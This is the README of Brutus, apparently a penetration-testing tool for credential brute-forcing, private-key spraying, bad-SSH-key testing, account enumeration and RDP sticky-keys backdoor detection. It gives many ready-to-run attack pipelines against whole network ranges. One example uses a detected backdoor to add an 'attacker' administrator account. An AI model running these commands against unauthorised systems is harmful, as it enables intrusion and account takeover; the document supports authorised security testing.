<img width="2752" height="1536" alt="Brutus - Social" src="https://github.com/user-attachments/assets/d190be41-570c-4f29-87aa-50b9bd4cd6c3" />
<h1 align="center">Brutus</h1>

<p align="center">
  <em>"Et tu, Brute?" — The last words before credentials fall.</em>
</p>

<p align="center">
  <strong>Modern credential testing tool in pure Go</strong>
</p>

<p align="center">
  <a href="#installation">Installation</a> •
  <a href="#quick-start">Quick Start</a> •
  <a href="#pipeline-integration">Pipeline</a> •
  <a href="#supported-protocols">Protocols</a> •
  <a href="#account-enumeration">Enumeration</a> •
  <a href="#socks5-proxy-support">Proxy</a> •
  <a href="#library-integration">Library</a>
</p>

---

## Overview

Brutus is a multi-protocol authentication testing tool designed to address a critical gap in offensive security tooling: efficient credential validation across diverse network services. While HTTP-focused tools are abundant, penetration testers and red team operators frequently encounter databases, SSH, SMB, and other network services that require purpose-built authentication testing capabilities.

Built in Go as a single binary with zero external dependencies, Brutus integrates seamlessly with [Nerva](https://github.com/praetorian-inc/nerva) for automated service discovery, enabling operators to rapidly identify and test authentication vectors across entire network ranges.

**Key features:**
- **Zero dependencies:** Single binary, cross-platform (Linux, Windows, macOS)
- **27 protocols:** SSH, RDP, MySQL, PostgreSQL, MSSQL, Oracle, Redis, SMB, LDAP, WinRM, SNMP, HTTP Basic Auth, and more
- **SOCKS5 proxy support:** Route all traffic through a SOCKS5 proxy with `--proxy`
- **Aggressiveness modes:** `--mode cautious|default|aggressive` for tuning coverage vs. safety
- **Pipeline integration:** Native support for Nerva, naabu, nmap, and masscan workflows
- **Embedded bad keys:** Built-in collection of known SSH keys (Vagrant, F5, ExaGrid, etc.)
- **Account enumeration:** account-existence oracle enumeration, Kerberos user enumeration, email generation, Microsoft Teams/Entra ID device code auth
- **Go library:** Import directly into your security automation tools
- **Production ready:** Rate limiting, connection pooling, and comprehensive error handling

---

## Why Brutus?

Traditional tools like **THC Hydra** have served the security community well, but they come with significant friction: complex dependency chains, platform-specific compilation issues, and no native integration with modern reconnaissance workflows.

**Brutus** is purpose-built for modern offensive security:

- **True zero-dependency deployment:** Download a single binary and run. No `libssh-dev`, no `libmysqlclient-dev`, no compilation errors. Works identically on Linux, macOS, and Windows.

- **Native pipeline integration:** Brutus speaks JSON and integrates directly with [Nerva](https://github.com/praetorian-inc/nerva), [naabu](https://github.com/projectdiscovery/naabu), [nmap](https://nmap.org), and [masscan](https://github.com/robertdavidgraham/masscan). Pipe discovered services straight into credential testing without format conversion or scripting.

- **Embedded intelligence:** Known SSH bad keys (Vagrant, F5 BIG-IP, ExaGrid, etc.) are compiled into the binary. Use `brutus badkeys` to test them against SSH targets.

- **Library-first design:** Import Brutus directly into your Go security tools. Build custom automation without shelling out to external processes.

```bash
# Full network credential audit in one pipeline (JSON mode)
naabu -host 10.0.0.0/24 -p 22,3306,5432,6379 -silent | nerva --json | brutus creds --json

# Or use Nerva's default URI output — no --json flags needed
naabu -host 10.0.0.0/24 -p 22,3306,5432,6379 -silent | nerva | brutus creds
```

---

## Use Cases

### Penetration Testing
- Validate discovered credentials across multiple services during internal assessments
- Test password reuse patterns across database and file share services
- Identify default credentials on newly deployed infrastructure

### Red Team Operations
- Rapid credential validation after password dumps or phishing campaigns
- Test lateral movement opportunities across network services
- Validate compromised credentials across heterogeneous environments

### Private Key Spraying

Found a private key on a compromised system? Spray it across the network to find where else it grants access:

```bash
# Discover SSH services and spray a found private key
naabu -host 10.0.0.0/24 -p 22 -silent | \
  nerva --json | \
  brutus creds -u root,admin,ubuntu,deploy -k /path/to/found_key --json
```

This pipeline discovers all SSH services, identifies them with Nerva, and tests the compromised key against common usernames—revealing lateral movement opportunities in seconds.

### Web Admin Panel Testing

Discover HTTP services and test credentials using AI-powered detection or manual credential lists:

```bash
# AI-powered: auto-detect devices and suggest default credentials
naabu -host 10.0.0.0/24 -p 80,443,3000,8080,9090 -silent | \
  nerva --json | \
  brutus web --experimental-ai --json

# Manual: test specific credentials against web panels
naabu -host 10.0.0.0/24 -p 80,443,8080 -silent | \
  nerva --json | \
  brutus web -c "admin:admin,root:password" --json

# Default wordlist: test common credentials without AI or -c
naabu -host 10.0.0.0/24 -p 80,443,8080 -silent | \
  nerva --json | \
  brutus web --json
```

### Security Validation
- Test default credentials on newly deployed services
- Validate password policy enforcement across platforms
- Generate audit trails for compliance and security assessments

---

## Installation

### Pre-built Binaries (Recommended)

Download from [GitHub Releases](https://github.com/praetorian-inc/brutus/releases):

```bash
# Linux (amd64)
curl -L https://github.com/praetorian-inc/brutus/releases/latest/download/brutus-linux-amd64.tar.gz | tar xz
sudo mv brutus /usr/local/bin/

# macOS (Apple Silicon)
curl -L https://github.com/praetorian-inc/brutus/releases/latest/download/brutus-darwin-arm64.tar.gz | tar xz
sudo mv brutus /usr/local/bin/

# macOS (Intel)
curl -L https://github.com/praetorian-inc/brutus/releases/latest/download/brutus-darwin-amd64.tar.gz | tar xz
sudo mv brutus /usr/local/bin/
```

```powershell
# Windows (PowerShell)
Invoke-WebRequest -Uri https://github.com/praetorian-inc/brutus/releases/latest/download/brutus-windows-amd64.zip -OutFile brutus.zip
Expand-Archive -Path brutus.zip -DestinationPath .
Remove-Item brutus.zip
```

### Go Install

```bash
go install github.com/praetorian-inc/brutus/cmd/brutus@latest
```

---

## Quick Start

### Subcommands

Brutus organizes its functionality into six focused subcommands:

```bash
brutus creds    # Non-HTTP credential auditing (SSH, databases, SMB, etc.)
brutus web      # HTTP/web panel auditing (Basic Auth, form login, AI-powered)
brutus snmp     # SNMP community string testing
brutus badkeys  # Known weak/compromised SSH key testing
brutus logon    # Windows logon-screen backdoor detection (sticky keys, utilman)
brutus enum     # Account enumeration (account-existence oracles, Kerberos, Teams auth, email generation)
```

Each subcommand has aliases for discoverability:

| Subcommand | Aliases |
|------------|---------|
| `creds` | `services`, `defaults`, `credentials` |
| `web` | `http`, `panels` |
| `snmp` | `community` |
| `badkeys` | `keys`, `ssh-keys`, `badkey` |
| `logon` | `stickykeys`, `sticky-keys`, `utilman`, `sethc`, `winlogon`, `accessibility` |
| `enum` | *(none)* |

```bash
# Test SSH credentials
brutus creds --target 192.168.1.100:22 --protocol ssh -u root -p toor

# Test HTTP web panel with AI credential detection
brutus web --target 192.168.1.1:80 --experimental-ai

# Test HTTP web panel with manual credentials
brutus web --target 192.168.1.1:80 -c "admin:admin,root:toor"

# Test SNMP community strings
brutus snmp --target 192.168.1.1:161 --mode aggressive

# Detect Windows logon-screen backdoors
brutus logon --target 10.0.0.50:3389

# Pipeline mode: creds skips HTTP/SNMP, web skips non-HTTP, snmp skips non-SNMP
naabu -host 10.0.0.0/24 -silent | nerva --json | brutus creds -P passwords.txt
naabu -host 10.0.0.0/24 -p 80,443,8080 -silent | nerva --json | brutus web --experimental-ai
naabu -host 10.0.0.0/24 -p 161 -silent | nerva --json | brutus snmp --mode aggressive
```

### Basic Usage

```bash
# Test SSH with default credentials
brutus creds --target 192.168.1.100:22 --protocol ssh

# Test with specific credentials
brutus creds --target 192.168.1.100:22 --protocol ssh -u root -p toor

# Test with username and password lists
brutus creds --target 192.168.1.100:22 --protocol ssh -U users.txt -P passwords.txt

# Test MySQL database
brutus creds --target 192.168.1.100:3306 --protocol mysql -u root -p password

# Test SSH with a specific private key
brutus creds --target 192.168.1.100:22 --protocol ssh -u deploy -k /path/to/id_rsa

# Increase threads for faster testing
brutus creds --target 192.168.1.100:22 --protocol ssh -t 20

# JSON output for scripting
brutus creds --target 192.168.1.100:22 --protocol ssh --json
```

### Output Example

```
$ brutus creds --target 192.168.1.100:22 --protocol ssh -u root,admin -p toor,password,admin
[+] VALID: ssh root:toor @ 192.168.1.100:22 (1.23s)
```

With verbose mode (`-v`):

```
$ brutus creds --target 192.168.1.100:22 --protocol ssh -u root -p password,toor -v
[-] FAILED: ssh root:password @ 192.168.1.100:22 (0.45s)
[+] VALID: ssh root:toor @ 192.168.1.100:22 (0.52s)
```

JSON output for pipeline integration (outputs only successful credentials):

```
$ brutus creds --target 192.168.1.100:22 --protocol ssh -u root -p toor --json
{"protocol":"ssh","target":"192.168.1.100:22","username":"root","password":"toor","duration":"1.234567ms","banner":"SSH-2.0-OpenSSH_8.9p1"}
```

---

## Pipeline Integration

Brutus integrates seamlessly with **[Nerva](https://github.com/praetorian-inc/nerva)** and **[naabu](https://github.com/projectdiscovery/naabu)** for complete network reconnaissance.

### Real-World Scenarios

#### Scenario 1: Scanning a Corporate /24 Network

```bash
# Discover all open ports, identify services, test default credentials
naabu -host 10.10.10.0/24 -p 22,23,21,3306,5432,6379,27017,445 -silent | \
  nerva --json | \
  brutus creds --json -o results.json

# Same pipeline using Nerva's default URI output (no --json needed)
naabu -host 10.10.10.0/24 -p 22,23,21,3306,5432,6379,27017,445 -silent | \
  nerva | brutus creds -o results.json

# Review findings (all output is successful credentials)
cat results.json | jq '.'
```

#### Scenario 2: Bug Bounty Recon on a Target Domain

```bash
# Full pipeline against a single target
naabu -host target.example.com -top-ports 1000 -silent | \
  nerva --json | \
  brutus creds

# Or scan a list of subdomains
cat subdomains.txt | naabu -silent | nerva --json | brutus creds
```

#### Scenario 3: Database Hunting in an Internal Assessment

```bash
# Find and test all databases in a range
naabu -host 192.168.0.0/16 -p 3306,5432,1433,27017,6379,9042 -silent | \
  nerva --json | \
  brutus creds -t 5 --json | \
  tee database-findings.json

# Extract credentials in readable format
jq -r '"\(.target) \(.username):\(.password)"' database-findings.json
```

#### Scenario 4: SSH Key Testing Across Infrastructure

```bash
# Test embedded bad keys (Vagrant, F5 BIG-IP, ExaGrid, etc.) across a range
naabu -host 10.0.0.0/8 -p 22 -rate 1000 -silent | \
  nerva --json | \
  brutus badkeys --json -o ssh-key-findings.json

# Find systems using compromised SSH keys (key field is true)
cat ssh-key-findings.json | jq 'select(.key == true)'
```

#### Scenario 5: Targeted Service Testing

```bash
# Test only Redis instances found in the network
naabu -host 172.16.0.0/12 -p 6379 -silent | \
  nerva --json | \
  brutus creds

# Test only MongoDB with custom credentials
naabu -host 10.0.0.0/24 -p 27017 -silent | \
  nerva --json | \
  brutus creds -u admin,root,mongodb -p admin,password,mongodb
```

### Scan Tool Import (Nmap & Masscan)

Brutus can import targets directly from **nmap** and **masscan** scan output files, eliminating the need for format conversion or intermediate tools.

#### Nmap XML Import (`--nmap-file`)

Import targets from nmap's XML output (`-oX`). Nmap provides service fingerprinting, so Brutus automatically maps detected services to the correct protocol:

```bash
# Run an nmap service scan
nmap -sV -oX scan.xml 10.0.0.0/24 -p 22,3306,5432,6379,445,3389

# Feed nmap results directly to Brutus
brutus creds --nmap-file scan.xml -P passwords.txt

# Test web services from nmap scan
brutus web --nmap-file scan.xml -c "admin:admin,root:password"

# Test SNMP from nmap scan
brutus snmp --nmap-file scan.xml --mode aggressive

# JSON output for scripting
brutus creds --nmap-file scan.xml --json -o results.json
```

Nmap service names are automatically mapped to Brutus protocols (e.g., `ms-wbt-server` → `rdp`, `microsoft-ds` → `smb`). TLS is detected from nmap's `tunnel="ssl"` attribute. Only open ports on up hosts are imported.

#### Masscan JSON Import (`--masscan-file`)

Import targets from masscan's JSON output (`-oJ`). Since masscan is a port scanner only (no service fingerprinting), you must either specify `--protocol` or let Brutus auto-fingerprint with Nerva:

```bash
# Run a masscan port scan
masscan 10.0.0.0/24 -p 22,3306,5432,6379 -oJ scan.json --rate 10000

# Test all discovered ports as SSH (when you know what's running)
brutus creds --masscan-file scan.json --protocol ssh -u root -P passwords.txt

# Auto-fingerprint with Nerva (when services are unknown)
brutus creds --masscan-file scan.json -P passwords.txt
```

#### Combining with Other Workflows

The `--nmap-file` and `--masscan-file` flags work with all subcommands and are mutually exclusive with `--target`, `--targets-file`, and stdin:

```bash
# Scan for RDP backdoors from nmap results
brutus logon --nmap-file scan.xml

# Test SSH bad keys from nmap results
brutus badkeys --nmap-file scan.xml

# Override protocol for all masscan targets
brutus creds --masscan-file scan.json --protocol redis -p "redis,password"
```

### Pipeline Input Format

Brutus accepts multiple input formats from stdin:

**Nerva JSON** (`nerva --json`):
```bash
{"ip":"192.168.1.100","port":22,"protocol":"ssh","tls":false,"transport":"tcp","version":"OpenSSH_8.9p1"}
{"ip":"192.168.1.101","port":3306,"protocol":"mysql","tls":false,"transport":"tcp","version":"8.0.32"}
```

**Nerva URI** (default Nerva output, no `--json` needed):
```bash
# Nerva outputs URI-scheme lines by default
$ echo "github.com:22" | nerva
ssh://github.com:22 (20.205.243.166)

# Pipe directly to Brutus — protocol is extracted from the URI scheme
echo "10.0.0.1:22" | nerva | brutus creds
echo "10.0.0.0/24:3306" | naabu -silent | nerva | brutus creds
```

**Bare targets** (auto-fingerprinted with Nerva):
```bash
echo "192.168.1.100:22" | brutus creds
```

Brutus automatically:
- Parses JSON, URI scheme, and bare target formats
- Maps services to protocols
- Tests appropriate default credentials
- Outputs results in matching JSON format

### Pipeline Output Format

Brutus outputs only successful credentials in JSONL format (one JSON object per line):

```bash
# Brutus JSON output (with --json flag) - only successful authentications
{"protocol":"ssh","target":"192.168.1.100:22","username":"root","password":"toor","duration":"1.234567ms","banner":"SSH-2.0-OpenSSH_8.9p1"}
{"protocol":"mysql","target":"192.168.1.101:3306","username":"root","password":"","duration":"890.123µs"}
{"protocol":"ssh","target":"192.168.1.103:22","username":"vagrant","key":true,"duration":"2.345678ms","banner":"SSH-2.0-OpenSSH_9.6"}
```

**Note:** Failed authentication attempts are not included in JSON output. The `key` field appears (as `true`) when authentication used an SSH key instead of a password. The `llm_suggested` field appears (as `true`) when credentials were suggested by the AI system (`--experimental-ai`).

---

## Comparison

| Feature | Hydra | Medusa | Ncrack | **Brutus** |
|---------|:-----:|:------:|:------:|:----------:|
| Single Binary | ❌ | ❌ | ❌ | ✅ |
| Zero Dependencies | ❌ | ❌ | ❌ | ✅ |
| SOCKS5 Proxy | ✅ | ❌ | ❌ | ✅ |
| Nerva Pipeline | ❌ | ❌ | ❌ | ✅ |
| Nmap/Masscan Import | ❌ | ❌ | ❌ | ✅ |
| JSON Streaming | ⚠️ | ❌ | ❌ | ✅ |
| Cross-Platform | ⚠️ | ⚠️ | ⚠️ | ✅ |
| Consistent Errors | ⚠️ | ⚠️ | ⚠️ | ✅ |
| Active Development | ✅ | ⚠️ | ❌ | ✅ |
| Embedded Bad Keys | ❌ | ❌ | ❌ | ✅ |
| Go Library Import | ❌ | ❌ | ❌ | ✅ |

---

## Supported Protocols

Brutus supports **27 protocols**:

### Network Services
| Protocol | Port | Auth Methods | Use Case |
|----------|------|--------------|----------|
| SSH | 22 | Password, Private Keys | Servers, network equipment |
| FTP | 21 | Password | File servers, NAS devices |
| Telnet | 23 | Password | Legacy systems, IoT devices |
| VNC | 5900 | Password | Remote desktops |
| RDP | 3389 | NLA/CredSSP, Password | Windows servers, workstations |
| SNMP | 161 | Community String | Network devices, printers |

### Web Services
| Protocol | Port | Auth Methods | Use Case |
|----------|------|--------------|----------|
| HTTP | 80 | Basic Auth | Admin panels (Grafana, Jenkins, etc.) |
| HTTPS | 443 | Basic Auth | Secure admin panels |

### Enterprise Infrastructure
| Protocol | Port | Auth Methods | Use Case |
|----------|------|--------------|----------|
| SMB | 445 | Password, NTLM | Windows networks, file shares |
| LDAP | 389/636 | Bind DN | Active Directory, identity |
| WinRM | 5985/5986 | NTLM | Windows remote management |

### Databases
| Protocol | Port | Auth Methods | Use Case |
|----------|------|--------------|----------|
| MySQL | 3306 | Password | Web applications |
| PostgreSQL | 5432 | Password | Modern applications |
| MSSQL | 1433 | Password | Enterprise applications |
| MongoDB | 27017 | Password | NoSQL backends |
| Redis | 6379 | Password | Caching, sessions |
| Neo4j | 7687 | Password | Graph databases |
| Cassandra | 9042 | Password | Distributed databases |
| CouchDB | 5984 | HTTP Basic | Document stores |
| Elasticsearch | 9200 | HTTP Basic | Search engines |
| InfluxDB | 8086 | HTTP Basic | Time-series data |
| Oracle | 1521 | Password | Enterprise databases |

### Container & Orchestration
| Protocol | Port | Auth Methods | Use Case |
|----------|------|--------------|----------|
| Docker | 2375/2376 | Unauthenticated | Exposed Docker daemons |
| Kubernetes | 6443/10250 | Unauthenticated | Exposed K8s API/kubelet |

### Communications
| Protocol | Port | Auth Methods | Use Case |
|----------|------|--------------|----------|
| SMTP | 25/587 | Password | Mail relay |
| IMAP | 143/993 | Password | Mailbox access |
| POP3 | 110/995 | Password | Mailbox access |

---

## Embedded SSH Bad Keys

Single binary deployment with no external key files needed. Each key is paired with its default username for smart credential mapping, and CVE tracking enables compliance queries.

Brutus carries the **[rapid7/ssh-badkeys](https://github.com/rapid7/ssh-badkeys)** and **[Vagrant](https://github.com/hashicorp/vagrant)** key collections embedded in the binary:

```bash
# Test bad keys against a single target
brutus badkeys --target 192.168.1.100:22

# Pipeline mode: scan a range for compromised SSH keys
naabu -host 10.0.0.0/24 -p 22 -silent | nerva --json | brutus badkeys

# Test credentials (bad keys are NOT included in creds mode)
brutus creds --target 192.168.1.100:22 --protocol ssh -u root -p "password"
```

### Embedded Key Collection

| Product | CVE | Default User | Description |
|---------|-----|--------------|-------------|
| Vagrant | - | vagrant, root | HashiCorp Vagrant insecure key |
| F5 BIG-IP | CVE-2012-1493 | root | Static SSH host key |
| ExaGrid | CVE-2016-1561 | root | Backup appliance backdoor |
| Monroe DASDEC | CVE-2013-0137 | root | Emergency alert systems |
| Barracuda | CVE-2014-8428 | cluster | Load balancer VM |
| Ceragon FibeAir | CVE-2015-0936 | mateidu | Wireless backhaul |
| Array Networks | - | sync | vAPV/vxAG appliances |
| Quantum DXi | - | root | Deduplication appliances |
| Loadbalancer.org | - | root | Enterprise load balancers |

---

## Aggressiveness Modes

The global `--mode` flag (`-m`) controls aggressiveness across all subcommands. It sets performance tuning presets that balance coverage against safety:

| Mode | Threads | Timeout | Rate Limit | Jitter | Retries | Use Case |
|------|---------|---------|------------|--------|---------|----------|
| `cautious` | 5 | 15s | 2 req/s | 500ms | 1 | Production environments, avoid lockouts |
| `default` | 10 | 10s | Unlimited | None | 2 | Standard testing |
| `aggressive` | 20 | 10s | Unlimited | None | 3 | Lab/CTF environments, maximum coverage |

Mode presets are applied first, then any explicit CLI flags override them:

```bash
# Safe mode for production Active Directory (low concurrency, rate-limited)
brutus creds --target dc.corp.local:445 --protocol smb -m cautious -U users.txt -P passwords.txt

# Maximum coverage for a CTF
brutus creds --target 10.10.10.100:22 --protocol ssh -m aggressive -U users.txt -P rockyou.txt

# Cautious mode but override threads
brutus creds --target 192.168.1.100:22 --protocol ssh -m cautious --threads 20
```

For SNMP, the mode also controls the built-in wordlist depth (see [SNMP Community String Testing](#snmp-community-string-testing)).

---

## SOCKS5 Proxy Support

The `--proxy` flag routes all connections through a SOCKS5 proxy. This works across all protocols and subcommands:

```bash
# Route SSH testing through a SOCKS5 proxy
brutus creds --target 10.0.0.100:22 --protocol ssh --proxy socks5://127.0.0.1:1080

# Proxy with authentication
brutus creds --target 10.0.0.100:3306 --protocol mysql --proxy socks5://user:pass@proxy.example.com:1080

# DNS resolution on the proxy side (socks5h)
brutus creds --target internal.corp:22 --protocol ssh --proxy socks5h://127.0.0.1:1080

# Combine with pipeline input
naabu -host 10.0.0.0/24 -p 22,3306 -silent | nerva --json | brutus creds --proxy socks5://127.0.0.1:1080

# Works with all subcommands
brutus web --target 192.168.1.1:8080 --proxy socks5://127.0.0.1:1080
brutus snmp --target 192.168.1.1:161 --proxy socks5://127.0.0.1:1080
```

Supported schemes:
- `socks5://` — Standard SOCKS5 proxy (client-side DNS resolution)
- `socks5h://` — SOCKS5 with remote DNS resolution (useful when targeting internal hostnames)

---

## SNMP Community String Testing

The `snmp` subcommand provides dedicated SNMP v1/v2c community string testing with tiered wordlists controlled by the global `--mode` flag:

| Mode | Strings | Coverage |
|------|---------|----------|
| `cautious` | ~25 | Common strings (public, private, community, etc.) |
| `default` | ~25 | Same as cautious |
| `aggressive` | 200+ | Comprehensive (vendor-specific, SCADA, IP cameras, storage, etc.) |

```bash
# Test with default community strings (~25)
brutus snmp --target 192.168.1.1:161

# Aggressive mode for comprehensive testing (200+)
brutus snmp --target 10.0.0.1:161 --mode aggressive

# Custom community strings
brutus snmp --target 192.168.1.1:161 -c "mycommunity,secretstring"

# Custom community string file
brutus snmp --target 192.168.1.1:161 -C community-strings.txt

# Pipeline mode
naabu -host 10.0.0.0/24 -p 161 -silent | nerva --json | brutus snmp --mode aggressive
```

---

## Library Integration

For developers building security automation tools, Brutus can also be imported as a Go library:

```bash
go get github.com/praetorian-inc/brutus
```

```go
package main

import (
    "fmt"
    "time"

    "github.com/praetorian-inc/brutus/pkg/brutus"
    _ "github.com/praetorian-inc/brutus/pkg/builtins" // registers all protocols and analyzers
)

func main() {
    config := &brutus.Config{
        Target:        "192.168.1.100:22",
        Protocol:      "ssh",
        Usernames:     []string{"root", "admin"},
        Passwords:     []string{"password", "admin", "toor"},
        Timeout:       5 * time.Second,
        Threads:       10,
    }

    results, err := brutus.Brute(config)
    if err != nil {
        panic(err)
    }

    for _, r := range results {
        if r.Success {
            fmt.Printf("[+] Valid: %s:%s\n", r.Username, r.Password)
        }
    }
}
```

---

## Experimental: AI-Powered Credential Detection

> **⚠️ Experimental Feature:** AI features require external API keys and are under active development.

### The `--experimental-ai` Flag

The `--experimental-ai` flag enables automatic credential detection for HTTP services:

```bash
# Set up API keys
export ANTHROPIC_API_KEY="your-anthropic-key"    # Required: Claude Vision for device identification
export PERPLEXITY_API_KEY="your-perplexity-key"  # Optional: additional web search

# AI-powered credential testing against HTTP services
naabu -host 192.168.1.0/24 -p 80,443,8080 -silent | \
  nerva --json | \
  brutus web --experimental-ai
```

**How it works:**

1. **Detection** — Brutus probes HTTP targets to detect auth type (Basic Auth vs form-based)
2. **Device Identification** — Claude Vision analyzes screenshots to identify the device/application
3. **Credential Suggestions** — Claude suggests default credentials from its training data
4. **Optional Web Search** — Perplexity (if configured) searches for additional credentials online
5. **Testing** — Tests the discovered credentials against the target

**For HTTP Basic Auth targets:**
- Probes `/` to capture HTTP headers
- Identifies device from Server header, WWW-Authenticate realm, etc.
- Claude suggests likely default credentials
- Tests credential pairs automatically

**For HTTP form-based auth targets:**
- Uses headless Chrome to render and screenshot the page
- Claude Vision identifies the login form, device type, and suggests credentials
- Perplexity (optional) searches for additional default credentials
- Browser automation fills and submits the form

**Requirements:**
- `ANTHROPIC_API_KEY` — **Required** for Claude Vision (device identification + credential suggestions)
- `PERPLEXITY_API_KEY` — *Optional* for additional web search research
- Chrome/Chromium installed (for form-based auth only)

**Non-HTTP protocols (SSH, MySQL, etc.) are unaffected by `--experimental-ai`** — they continue to use standard credential testing.

---

## RDP: Sticky Keys Backdoor Detection & Exploitation

Brutus includes automatic detection of the **sticky keys backdoor** (MITRE ATT&CK [T1546.008](https://attack.mitre.org/techniques/T1546/008/)) on RDP targets. This pre-authentication check runs on non-NLA RDP targets — no credentials required.

**How it works:**

1. Connects to the RDP target and negotiates a non-NLA session
2. Captures the login screen bitmap as a baseline
3. Sends 5x Shift key (the sticky keys trigger)
4. Captures the response bitmap
5. Heuristic analysis detects if a terminal window appeared (cmd.exe, PowerShell, etc.)
6. Optionally confirms via Claude Vision API (when `ANTHROPIC_API_KEY` is set)

```bash
# Detection only — no brute force
brutus logon --target 10.0.0.50:3389

# Detection + Vision API confirmation
brutus logon --target 10.0.0.50:3389 --experimental-ai
```

**Detection-only mode:** The `logon` subcommand runs sticky keys and utilman backdoor detection without brute force:

```bash
# Detection only (no brute force)
brutus logon --target 10.0.0.50:3389
```

**Detection output:**

```
[CRITICAL] Sticky keys backdoor CONFIRMED (confidence: 85%)
sethc.exe has been replaced with cmd.exe or similar.
SYSTEM-level unauthenticated access available via 5x Shift.
```

### Command Execution via Backdoor (`--exec`)

Once a backdoor is detected, execute a command on the remote system through the pre-auth command prompt:

```bash
# Execute a single command via the backdoor
brutus logon --target 10.0.0.50:3389 --exec "whoami"

# Add a local admin account
brutus logon --target 10.0.0.50:3389 \
  --exec "net user attacker P@ssw0rd /add && net localgroup administrators attacker /add"
```

This connects, triggers the backdoor, types the command, presses Enter, waits for output, and saves a PNG screenshot of the result.

### Interactive Web Terminal (`--web`)

Launch a browser-based RDP viewer for live interaction with the backdoor command prompt:

```bash
# Start interactive web terminal
brutus logon --target 10.0.0.50:3389 --web
```

This starts a local HTTP server with:
- **Live screen streaming** at ~10 FPS (JPEG over WebSocket)
- **Full keyboard forwarding** (PS/2 scancodes mapped from browser KeyboardEvent)
- **Mouse support** (click, move, right-click)
- **Connection status** with disconnect overlay and reconnect button

Open the displayed URL (e.g., `http://127.0.0.1:<port>`) in any browser to interact with the remote RDP session. If the session disconnects due to server-side idle timeout, click **Reconnect** to establish a new session.

> **Note:** Non-NLA RDP sessions have a server-side idle timeout (Windows default varies by configuration, typically controlled by Group Policy at `Computer Configuration > Administrative Templates > Remote Desktop Services > Session Time Limits`). To extend the timeout on a test target, set `MaxIdleTime` to `0` in the registry:
>
> ```
> HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\MaxIdleTime = 0 (DWORD)
> ```

**B-TP (Benign True Positive) considerations:** The backdoor replacement may also indicate forgotten password recovery procedures or artifacts from authorized penetration tests.

### Mass RDP Scanning Pipeline

For large-scale assessments, the `logon` subcommand runs backdoor detection across multiple targets. It accepts pipeline input, targets files, or nmap/masscan imports — only RDP services are tested:

```bash
# Scan a /24 for sticky keys and utilman backdoors
naabu -host 10.0.0.0/24 -p 3389 -silent | \
  nerva --json | \
  brutus logon --json -o rdp-findings.json

# Scan from nmap results
brutus logon --nmap-file scan.xml --json -o rdp-findings.json

# Scan from targets file
brutus logon --targets-file rdp-targets.txt --json

# Extract critical findings
jq 'select(.finding == "[CRITICAL]")' rdp-findings.json
```

**Technical implementation:** RDP protocol support uses [IronRDP](https://github.com/Devolutions/IronRDP) (Rust) compiled to WebAssembly and executed via [wazero](https://github.com/tetratelabs/wazero), maintaining Brutus's zero-CGO, single-binary design.

---

## Account Enumeration

The `enum` subcommand enumerates which account-existence oracles work for an organization (and enumerates emails against them) or enumerates Active Directory users, all without sending passwords.

### Account-Existence Oracle Enumeration

Identify which unauthenticated account-existence oracles (microsoft365, google, github, plus the Microsoft Teams oracle) work for an organization, validate them against a known-valid user, then enumerate candidate emails against the working oracles. DNS TXT recon surfaces the candidate oracles; the validation against `--known-valid` is the headline. `--known-valid` is required, and enumeration runs only against the oracles that confirm it:

```bash
# Discover candidate oracles via DNS and report which ones work
brutus enum active oracles --domain example.com --known-valid admin@example.com

# Enumerate specific emails against the working oracles
brutus enum active oracles --domain example.com -e user@example.com,admin@example.com --known-valid admin@example.com

# Enumerate emails from file
brutus enum active oracles --domain example.com -E emails.txt --known-valid admin@example.com

# Generate emails from embedded name lists and enumerate against working oracles
brutus enum active oracles --domain example.com --generate --format flast --known-valid admin@example.com

# Discover working oracles with a known-valid email before large-scale enumeration
brutus enum active oracles discover --domain example.com --known-valid admin@example.com
```

### Kerberos User Enumeration

Enumerate Active Directory usernames via Kerberos AS-REQ (no passwords sent, no lockout risk):

```bash
# Enumerate specific users
brutus enum active kerberos --dc 10.0.0.1 --domain CORP.LOCAL -u administrator,guest,krbtgt

# Enumerate from file
brutus enum active kerberos --dc dc01.corp.local --domain CORP.LOCAL -U users.txt

# Generate usernames and pipe to Kerberos enum
brutus enum generate --format flast | brutus enum active kerberos --dc 10.0.0.1 --domain CORP.LOCAL -U -
```

### Email/Username Generation

Generate email addresses or usernames from embedded first/last name wordlists:

```bash
# Generate emails: jsmith@example.com
brutus enum generate --domain example.com --format flast

# Generate usernames only (no domain): jsmith
brutus enum generate --format flast

# Available formats: first.last, flast, firstl, f.last, lastf, last.first, lastfirst, first
brutus enum generate --domain example.com --format first.last
```

---

### Hunter.io Domain Search

Discover people (email, name, job title, phone, department, seniority, confidence) associated with a domain via the Hunter.io Domain Search API. Paginates automatically until all results are retrieved.

```bash
# Requires a Hunter.io API key — set via env var (preferred, keeps key out of process list)
export HUNTER_API_KEY=your_key_here

# Discover people for a domain
brutus enum hunter --domain example.com

# Provide the key explicitly (visible in process list and shell history — prefer HUNTER_API_KEY)
brutus enum hunter --domain example.com --api-key your_key_here

# JSONL output to file (one record per person, with type:"hunter" discriminator)
brutus enum hunter --domain example.com --output people.jsonl

# Adjust pagination page size (default: 100)
brutus enum hunter --domain example.com --limit 50
```

---

### Microsoft Teams / Entra ID Authentication

Obtain an OAuth2 access token, refresh token, and ID token from Microsoft Entra ID (Azure AD) using the [device code flow](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code) (RFC 8628). The resulting tokens can be used for Microsoft Graph API calls, Teams enumeration, and auditing via tools like [ROADtools](https://github.com/dirkjanm/ROADtools) or custom Graph queries.

```bash
# Authenticate against the common endpoint (any Microsoft tenant)
brutus enum active teams auth

# Authenticate against a specific tenant by domain or GUID
brutus enum active teams auth --tenant contoso.com
brutus enum active teams auth --tenant 00000000-0000-0000-0000-000000000000

# Request a different resource scope (space-separated). The default targets the
# Skype/Teams resource (api.spaces.skype.com); the Teams client is NOT
# authorized for Microsoft Graph (Graph yields AADSTS65002).
brutus enum active teams auth --scope "offline_access https://api.spaces.skype.com/.default"

# Use a custom app registration (your own Azure app client ID)
brutus enum active teams auth --client-id 00000000-0000-0000-0000-000000000000

# Capture the full token set as JSONL for piping to other tools
brutus enum active teams auth -o tokens.jsonl
brutus enum active teams auth --json
```

**How it works:**

1. Brutus requests a device code from `login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode`
2. A short code and URL are displayed — open the URL in any browser and enter the code
3. Brutus polls until you complete sign-in, the code expires, or you press `Ctrl+C`
4. On success, the access token, refresh token, and ID token are printed

**Human output** shows only the first 20 characters of the access token (sufficient for verification). Use `--json` or `-o` to capture the full token values.

